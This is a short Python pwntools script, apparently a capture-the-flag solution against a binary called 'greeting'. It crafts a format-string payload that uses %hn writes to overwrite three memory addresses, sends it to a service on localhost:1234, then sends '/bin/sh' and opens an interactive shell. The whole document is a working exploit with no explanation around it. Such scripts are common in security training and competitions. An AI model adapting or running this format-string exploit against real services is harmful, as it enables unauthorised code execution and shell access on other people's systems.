from pwn import *

payload = b"AA" + b"\x34\x99\x04\x08" + b"\x54\x9A\x04\x08" + b"\x56\x9A\x04\x08" + b"%34253x%12$hn" + b"%65187x%13$hn" + b"%33652x%14$hn"

#s=process('./greeting')
s=remote('localhost', 1234)
print (s.recvuntil('... '))
s.sendline(payload)
print (s.recvuntil('... '))
s.sendline(b"/bin/sh")
s.interactive()